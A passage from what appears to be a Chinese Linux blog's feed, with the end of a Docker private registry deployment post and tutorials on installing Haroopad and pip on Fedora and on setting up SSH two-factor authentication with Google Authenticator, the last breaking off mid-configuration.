<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[root@docker-registry ~]# docker run -i -t 10.82.2.103:5000/busybox </div><div class="line">/ # hostname </div><div class="line">11ea9195246f</div><div class="line">/ # hostid </div><div class="line">11ac0300</div><div class="line">/ #</div></pre></td></tr></table></figure>
</li>
<li><p>在其他容器计算节点上进行测试<br>测试内容包括：拉取私有镜像仓库中的镜像、在容器计算节点上查看所拉取的镜像、从私有镜像仓库中拉取的镜像启动容器。</p>
<ul>
<li><p>拉取私有镜像仓库中的镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[I] $ docker pull 10.82.2.103:5000/busybox</div><div class="line">Using default tag: latest</div><div class="line">latest: Pulling from busybox</div><div class="line">04176c8b224a: Pull complete </div><div class="line">Digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5</div><div class="line">Status: Downloaded newer image for 10.82.2.103:5000/busybox:latest</div></pre></td></tr></table></figure>
</li>
<li><p>查看拉取的镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[I] $ docker images</div><div class="line">REPOSITORY                  TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">10.82.2.103:5000/busybox   latest              00f017a8c2a6        13 days ago         1.11 MB</div><div class="line">ubuntu                      latest              4ca3a192ff2a        3 months ago        128.2 MB</div><div class="line">centos                      latest              0584b3d2cf6d        4 months ago        196.5 MB</div><div class="line">registry                    latest              c9bd19d022f6        5 months ago        33.27 MB</div><div class="line">[I] $ sudo ip add |grep 192</div><div class="line">    inet 192.168.66.3/24 brd 192.168.66.255 scope global enp0s25</div><div class="line">    inet 192.168.66.4/24 brd 192.168.66.255 scope global wlp3s0</div></pre></td></tr></table></figure>
</li>
<li><p>从私有镜像仓库中拉取的镜像启动容器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[I] $ sudo ip add |grep 192</div><div class="line">    inet 192.168.66.3/24 brd 192.168.66.255 scope global enp0s25</div><div class="line">    inet 192.168.66.4/24 brd 192.168.66.255 scope global wlp3s0</div><div class="line">[I] $ docker run -i -t 10.82.2.103:5000/busybox</div><div class="line">/ # hostname &amp;&amp;hostid</div><div class="line">4ed4430a0b8d</div><div class="line">11ac0200</div><div class="line">/ #</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>可以看到可以正常启动容器</p>
<p>至此，私有镜像仓库部署完成。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;关于本文&quot;&gt;&lt;a href=&quot;#关于本文&quot; class=&quot;headerlink&quot; title=&quot;关于本文&quot;&gt;&lt;/a&gt;关于本文&lt;/h2&gt;&lt;p&gt;本文简介生产环境中私有镜像仓库节点的部署及自定义环境配置。&lt;/p&gt;
&lt;h2 id=&quot;硬件要求&quot;&gt;&lt;a href=&quot;#硬件要求
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="Docker私有仓库" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/Docker%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="容器私有仓库配置" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93%E9%85%8D%E7%BD%AE/"/>
    
      <category term="Docker私有仓库" scheme="http://blog.unixmen.cn/tags/Docker%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>Fedora安装Haroopad</title>
    <link href="http://blog.unixmen.cn/2017/05/02/Fedora%E5%AE%89%E8%A3%85Haroopad/"/>
    <id>http://blog.unixmen.cn/2017/05/02/Fedora安装Haroopad/</id>
    <published>2017-05-02T08:59:14.000Z</published>
    <updated>2017-05-02T10:08:43.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Haroopad是一款跨平台的Markdown编辑器，在windows下，可下载安装包，通过安装想到进行安装。在Ubuntu/Mac OS下可载官方打包好的deb软件，通过包命令可以安装。<br>然而在其他Linux系列版本下并没有对应的软件包，所以需要下载源码包进行安装；<br>值得一提的是，Haroopad在所有平台下都区分32/64位版本。</p>
<h2 id="介绍安装环境"><a href="#介绍安装环境" class="headerlink" title="介绍安装环境"></a>介绍安装环境</h2><p>我的Fedora版本是23，Haroopad版本是0.13.1 64位（这也是截至今天最新的稳定版本）。</p>
<h2 id="下载源码安装包："><a href="#下载源码安装包：" class="headerlink" title="下载源码安装包："></a>下载源码安装包：</h2><p><a href="https://bitbucket.org/rhiokim/haroopad-download/downloads/haroopad-v0.13.1-x64.tar.gz" target="_blank" rel="external">官方下载地址为：</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://bitbucket.org/rhiokim/haroopad-download/downloads/haroopad-v0.13.1-x64.tar.gz</div></pre></td></tr></table></figure>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
<li><p>将下载的软件包解压：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar -zxvf haroopad-v0.13.1-x64.tar.gz</div></pre></td></tr></table></figure>
</li>
<li><p>再将解压出来的软件包解压：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar -zxvf data.tar.gz</div></pre></td></tr></table></figure>
</li>
<li><p>将解压出来的文件复制到根目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp -rv ./usr /</div></pre></td></tr></table></figure>
</li>
<li><p>将另一个软件包也解压出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar -zxvf control.tar.gz</div></pre></td></tr></table></figure>
</li>
<li><p>将从control.tar.gz 中解压出来的文件添加可行权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 755 postinst</div></pre></td></tr></table></figure>
</li>
<li><p>运行postinst</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./postinst</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="创建“-desktop”-文件"><a href="#创建“-desktop”-文件" class="headerlink" title="创建“.desktop” 文件"></a>创建“.desktop” 文件</h2><p>使用以下命令创建“.desktop” 文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">cat &gt;/usr/share/applications/Haroopad.desktop&lt;&lt;EOF</div><div class="line">[Desktop Entry]</div><div class="line">Name=haroopad</div><div class="line">Version=0.13.1</div><div class="line">Exec=haroopad</div><div class="line">Comment=The Next Document processor based on Markdown</div><div class="line">Icon=haroopad</div><div class="line">Type=Application</div><div class="line">Terminal=false</div><div class="line">StartupNotify=true</div><div class="line">Encoding=UTF-8</div><div class="line">Categories=Development;GTK;GNOME;</div><div class="line">EOF</div></pre></td></tr></table></figure>
<h2 id="复制Hroopad-图标文件："><a href="#复制Hroopad-图标文件：" class="headerlink" title="复制Hroopad 图标文件："></a>复制Hroopad 图标文件：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp -rf usr/share/icons/hicolor/ /usr/share/icons/hicolor</div></pre></td></tr></table></figure>
<h2 id="至此Hroopad安装完成。"><a href="#至此Hroopad安装完成。" class="headerlink" title="至此Hroopad安装完成。"></a>至此Hroopad安装完成。</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;Haroopad是一款跨平台的Markdown编辑器，在windows下，可下载安装包，通过安装想到进行安装。在Ubuntu/Mac OS下
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="Haroopad" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/Haroopad/"/>
    
    
      <category term="Haroopad" scheme="http://blog.unixmen.cn/tags/Haroopad/"/>
    
      <category term="标记语言" scheme="http://blog.unixmen.cn/tags/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>如何在Fedora中安装pip2或pip3</title>
    <link href="http://blog.unixmen.cn/2017/05/02/%E5%A6%82%E4%BD%95%E5%9C%A8Fedora%E4%B8%AD%E5%AE%89%E8%A3%85pip2%E6%88%96pip3/"/>
    <id>http://blog.unixmen.cn/2017/05/02/如何在Fedora中安装pip2或pip3/</id>
    <published>2017-05-02T03:24:19.000Z</published>
    <updated>2017-05-02T10:11:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文章简介"><a href="#文章简介" class="headerlink" title="文章简介"></a>文章简介</h2><p>pip 是一个简单易用的python包管理工具。本文简要介绍pip2及pip3 的两种安装方式，当然pip2和pip3在同一套系统中pip3 跟pyhon一样，2版本和3版本是可以并存的。</p>
<h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><ul>
<li><p>首先我们清空我们系统中残留冗余包。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dnf clean all</div></pre></td></tr></table></figure>
</li>
<li><p>作为最佳体验，我们升级系统软件包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dnf update -y</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="现在可以安装pip工具包了"><a href="#现在可以安装pip工具包了" class="headerlink" title="现在可以安装pip工具包了"></a>现在可以安装pip工具包了</h2><h3 id="pip2"><a href="#pip2" class="headerlink" title="pip2"></a>pip2</h3><p>使用以下命令进行安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dnf -y install python-pip</div></pre></td></tr></table></figure></p>
<ul>
<li>也可以通过以下方式进行安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m pip install -U pip</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="pip3"><a href="#pip3" class="headerlink" title="pip3"></a>pip3</h3><p>使用以下命令进行安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dnf -y install python3-pip</div></pre></td></tr></table></figure></p>
<ul>
<li>也可以通过以下方式进行安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python3 -m pip install -U pip</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="验证："><a href="#验证：" class="headerlink" title="验证："></a>验证：</h2><p>pip安装完成后，我们可以进行验证是否正确了安装成功，具体操作如下：</p>
<h3 id="首先可以获取帮助文档"><a href="#首先可以获取帮助文档" class="headerlink" title="首先可以获取帮助文档"></a>首先可以获取帮助文档</h3><ul>
<li><p>如果仅仅pip2或着pip3可以通过以下命令进行验证：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip --help</div></pre></td></tr></table></figure>
</li>
<li><p>假如系统中同时安装了pip2和pip3 就要制定pip命令版本进行验证：</p>
<ul>
<li><p>如查看pip3的帮助文档：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip3 --help</div></pre></td></tr></table></figure>
</li>
<li><p>查看pip3的帮助文档</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip2 --help</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>其次还可以获取版本信息：</p>
<ul>
<li><p>pip2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip2 -V</div></pre></td></tr></table></figure>
</li>
<li><p>pip3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip3 -V</div></pre></td></tr></table></figure>
</li>
<li><p>你pip -V 命令将获取类似如下结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip 9.0.1 from /usr/lib/python2.7/site-packages (python 2.7)</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;文章简介&quot;&gt;&lt;a href=&quot;#文章简介&quot; class=&quot;headerlink&quot; title=&quot;文章简介&quot;&gt;&lt;/a&gt;文章简介&lt;/h2&gt;&lt;p&gt;pip 是一个简单易用的python包管理工具。本文简要介绍pip2及pip3 的两种安装方式，当然pip2和pip3在同一
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="Python" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/Python/"/>
    
      <category term="pip" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/Python/pip/"/>
    
    
      <category term="pip" scheme="http://blog.unixmen.cn/tags/pip/"/>
    
      <category term="python" scheme="http://blog.unixmen.cn/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>SSH安全加固篇-通过运维密码实现Linux系统SSH双因子认证</title>
    <link href="http://blog.unixmen.cn/2017/03/29/%E9%80%9A%E8%BF%87%E8%BF%90%E7%BB%B4%E5%AF%86%E7%A0%81%E5%AE%9E%E7%8E%B0Linux%E7%B3%BB%E7%BB%9FSSH%E5%8F%8C%E5%9B%A0%E5%AD%90%E8%AE%A4%E8%AF%81/"/>
    <id>http://blog.unixmen.cn/2017/03/29/通过运维密码实现Linux系统SSH双因子认证/</id>
    <published>2017-03-29T00:38:24.000Z</published>
    <updated>2017-03-29T03:21:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="通过运维密码实现Linux系统SSH双因子认证"><a href="#通过运维密码实现Linux系统SSH双因子认证" class="headerlink" title="通过运维密码实现Linux系统SSH双因子认证"></a>通过运维密码实现Linux系统SSH双因子认证</h1><h2 id="关于本文"><a href="#关于本文" class="headerlink" title="关于本文"></a>关于本文</h2><p>本文讲述了如果通过Linux.中国提供的微信小程序”运维密码”结合 Google身份验证器”<a href="https://github.com/google/google-authenticator" target="_blank" rel="external">Google Authenticator</a>“实现Linux系统OpenSSH双因子认证对SSH进行安全加固。</p>
<h2 id="前言-背景"><a href="#前言-背景" class="headerlink" title="前言/背景"></a>前言/背景</h2><p>近来很多知名企业都出现了密码泄露，业内对多重认证的呼声也越来越高。</p>
<h2 id="双因子认证"><a href="#双因子认证" class="headerlink" title="双因子认证"></a>双因子认证</h2><ul>
<li>什么是双因子认证</li>
</ul>
<p>双因子认证（Two-factor authentication，也叫2FA），是一种通过组合两种不同的验证方式进行用户身份验证的机制。</p>
<ul>
<li><p>在这种多重认证的系统中，用户需要通过两种不同的认证程序：</p>
<ul>
<li><p>提供他们知道的信息（如 用户名/密码）</p>
</li>
<li><p>再借助其他工具提供用户所不知道的信息（如用手机生成的一次性密码）</p>
</li>
</ul>
</li>
</ul>
<h2 id="SSH双因子认证实现思路"><a href="#SSH双因子认证实现思路" class="headerlink" title="SSH双因子认证实现思路"></a>SSH双因子认证实现思路</h2><p>使用“运维密码”结合“Google身份验证器”及Linux系统“OpenSSH”双因子认证对SSH进行安全加固。</p>
<ul>
<li>关于Google 身份验证器</li>
</ul>
<p>为了鼓励广泛采用双因子认证的方式，Google 公司发布了 Google 身份验证器<a href="https://github.com/google/google-authenticator" target="_blank" rel="external">Google Authenticator</a>，一款开源的，可基于开放规则（如 HMAP/ 基于时间）生成一次性密码的软件。这是一款跨平台软件，可运行在 Linux、 Android、 iOS。Google 公司同时也支持插件式鉴别模块PAM （pluggable authentication module），使其能和其他也适用 PAM 进行验证的工具（如 OpenSSH）协同工作。</p>
<ul>
<li>关于运维密码</li>
</ul>
<p>Linux.中国社区长期接触互联网新技术的最前沿，洞察大势所趋，身兼新技术广泛传播及维护互联网安全的重任，以及方便运维及新技术的传播开发了运维密码小程序。</p>
<h2 id="如何开始"><a href="#如何开始" class="headerlink" title="如何开始"></a>如何开始</h2><p>首先我们需要一些准备工作：</p>
<ul>
<li><p>一台运行着 OpenSSH 服务版本大于6.2的 Linux 主机</p>
</li>
<li><p>一台能运行微信的智能手机</p>
</li>
<li><p>一台支持SSH登陆的终端</p>
</li>
</ul>
<h2 id="在-Linux-系统中安装-Google-身份验证器"><a href="#在-Linux-系统中安装-Google-身份验证器" class="headerlink" title="在 Linux 系统中安装 Google 身份验证器"></a>在 Linux 系统中安装 Google 身份验证器</h2><p>第一步需要在运行着 OpenSSH 服务的 Linux 主机上安装 Google 身份验证器。按照如下步骤安装 Google 身份验证器及其PAM模块。</p>
<h3 id="用安装包安装-Google-身份验证器"><a href="#用安装包安装-Google-身份验证器" class="headerlink" title="用安装包安装 Google 身份验证器"></a>用安装包安装 Google 身份验证器</h3><p>如果你不想自己构建 Google 身份验证器，在几个 Linux 发行版上有已经编译好的安装包。安装包里面包含 Google 身份验证器 二进制程序和 PAM 模块。</p>
<ul>
<li>在 Ubuntu 上安装 Google 身份验证器：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sudo apt-get install libpam-google-authenticator</div></pre></td></tr></table></figure>
<ul>
<li>在 Fedora 上安装 Google 身份验证器：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sudo dnf install google-authenticator</div></pre></td></tr></table></figure>
<ul>
<li>在 CentOS 上安装 Google 身份验证器：</li>
</ul>
<p>在 CentOS 上安装 Google 身份验证器 ，需要首先启用 EPEL 软件库，然后运行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sudo yum install google-authenticator</div></pre></td></tr></table></figure>
<h3 id="编译安装-Google-身份验证器"><a href="#编译安装-Google-身份验证器" class="headerlink" title="编译安装 Google 身份验证器"></a>编译安装 Google 身份验证器</h3><p>首先，安装构建 Google 身份验证器所需的软件包。</p>
<ul>
<li>在 Debian、 Ubuntu 或 Linux Mint 上：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sudo apt-get install wget make gcc libpam0g-dev</div></pre></td></tr></table></figure>
<ul>
<li>在 CentOS、 Fedora 或 RHEL上：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sudo yum install wget make gcc pam-devel</div></pre></td></tr></table></figure>
<ul>
<li>然后下载 Google 身份验证器的源代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">git clone https://github.com/google/google-authenticator.git</div></pre></td></tr></table></figure>
<ul>
<li>编译安装Google 身份验证器：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">cd google-authenticator/libpam</div><div class="line"></div><div class="line">./bootstrap.sh</div><div class="line"></div><div class="line">./configure</div><div class="line"></div><div class="line">make</div></pre></td></tr></table></figure>
<p>如果构建成功，你会在目录中看到 pam_google_authenticator.so 和 google-authenticator 两个文件。</p>
<p>最后，将 Google 身份验证器安装到合适位置。默认会安装到 /usr/local/lib/security 下，根据你的系统不同，你可能需要将其符号链接到 pam 库的位置（比如 CentOS 7 会在 /usr/lib64/security）。如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gamod.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sudo make install</div></pre></td></tr></table></figure>
<p>至此，Google 身份验证器安装完成。</p>
<h2 id="配置Google-身份验证器及运维密码"><a href="#配置Google-身份验证器及运维密码" class="headerlink" title="配置Google 身份验证器及运维密码"></a>配置Google 身份验证器及运维密码</h2><p>完成Google 身份验证器的安装我们仅仅完成了第一步，接着需要对Google 身份验证器、运维密码、SSH进行配置才能达到我们预期的效果。</p>
<h3 id="配置google-authenticator及生成验证密钥"><a href="#配置google-authenticator及生成验证密钥" class="headerlink" title="配置google-authenticator及生成验证密钥"></a>配置google-authenticator及生成验证密钥</h3><ul>
<li>使用（以下）命令生成验证密钥</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">google-authenticator</div></pre></td></tr></table></figure>
<ul>
<li><p>生成验证密钥的时候，会再次确认信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Do you want authentication tokens to be time-based (y/n)</div></pre></td></tr></table></figure>
<p>意思是：你想要生产基于时间生成验证码吗？这里需要需要输入y</p>
</li>
</ul>
<p>输入y之后你将看到一个二维码，它使用如下二维码图形格式表示我们数字形态的密钥。注：一会我们要用到它在运维密码上完成配置。</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/erweima.png" alt=""></p>
<ul>
<li><p>紧急验证码<br>在生成密钥的同时还生成了5个8位的紧急密码，当然，也是一次性使用的，请妥善保存，以备不时之需。</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/emergency.png" alt=""></p>
</li>
</ul>
<ul>
<li><p>保存Google Authenticator配置文件</p>
<p>Google Authenticator 虽然运行了，但是相关设置还没有保存，接下来会提示保存：</p>
<p>意思是：你想将配置文件写入到“/root/.google_authenticator”保存吗？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Do you want me to update your &quot;/root/.google_authenticator&quot; file? (y/n)</div></pre></td></tr></table></figure>
<p>输入y回车</p>
</li>
</ul>
<ul>
<li><p>禁止同一令牌多用途登陆</p>
<p>意思是：你是否要禁用同一密钥多用途登陆，这将限制你每30秒只能登陆一次，这将增加接收提醒的机会，甚至能够防止中间人攻击。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> Do you want to disallow multiple uses of the same authentication</div><div class="line"></div><div class="line">token? This restricts you to one login about every 30s, but it increases</div><div class="line"></div><div class="line">your chances to notice or even prevent man-in-the-middle attacks (y/n)</div></pre></td></tr></table></figure>
<p>输入y回车</p>
</li>
</ul>
<ul>
<li><p>时间容错设置</p>
<p>意思是:默认情况下，密钥在30秒内有效，为了防止由于客户端与服务器时间偏移（时间相差太大）导致认证失败，google authenticator设计时间容错措施。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> By default, tokens are good for 30 seconds. In order to compensate for</div><div class="line"></div><div class="line">possible time-skew between the client and the server, we allow an extra</div><div class="line"></div><div class="line">token before and after the current time. If you experience problems with</div><div class="line"></div><div class="line">poor time synchronization, you can increase the window from its default</div><div class="line"></div><div class="line">size of +-1min (window size of 3) to about +-4min (window size of</div><div class="line"></div><div class="line">17 acceptable tokens).</div><div class="line"></div><div class="line">Do you want to do so? (y/n)</div></pre></td></tr></table></figure>
<p>这个可根据实际情况进行配置。</p>
</li>
</ul>
<ul>
<li><p>暴力破解防护</p>
<p>意思是：在你的电脑存在暴力破解的情况下可开启身份认证次数限制模块，默认限制为：30秒内不超过三次登陆尝试。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> If the computer that you are logging into isn&apos;t hardened against brute-force</div><div class="line"></div><div class="line">login attempts, you can enable rate-limiting for the authentication module.</div><div class="line"></div><div class="line">By default, this limits attackers to no more than 3 login attempts every 30s.</div><div class="line"></div><div class="line">Do you want to enable rate-limiting (y/n)</div></pre></td></tr></table></figure>
<p>输入y回车</p>
</li>
</ul>
<ul>
<li><p>配置完成</p>
<p>配置完成后会在home目录下生成一个权限为400的隐藏文件，如下图所示：</p>
</li>
</ul>
<p> <img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/configfile.png" alt=""></p>
<h3 id="配置运维密码"><a href="#配置运维密码" class="headerlink" title="配置运维密码"></a>配置运维密码</h3><ul>
<li>打开微信小程序</li>
</ul>
<p>打开微信，依次点击发现，小程序</p>
<p> <img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/lp.jpg" alt=""></p>
<ul>
<li><p>输入“运维密码”并搜索</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/search.jpg" alt=""></p>
</li>
</ul>
<ul>
<li><p>点击“运维密码”进入应用</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/search.jpg" alt=""></p>
</li>
</ul>
<ul>
<li><p>点击右下角二维码图标</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/button.png" alt=""></p>
</li>
</ul>
<ul>
<li>扫一扫配置google-authenticator时所生成的二维码</li>
</ul>
<ul>
<li><p>点击确定添加场景</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/commit.jpg" alt=""></p>
</li>
</ul>
<ul>
<li><p>添加完成</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/adddone.jpg" alt=""></p>
</li>
</ul>
<h3 id="配置SSH服务"><a href="#配置SSH服务" class="headerlink" title="配置SSH服务"></a>配置SSH服务</h3><ul>
<li>添加认证模块</li>
</ul>
<p>在/etc/pam.d/sshd文件添加认证模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">echo &quot;auth required pam_google_authenticator.so&quot; &gt;&gt;/etc/pam.d/sshd</div></pre></td></tr></table></figure>
<ul>
<li>配置任何的密码认证</li>
</ul>
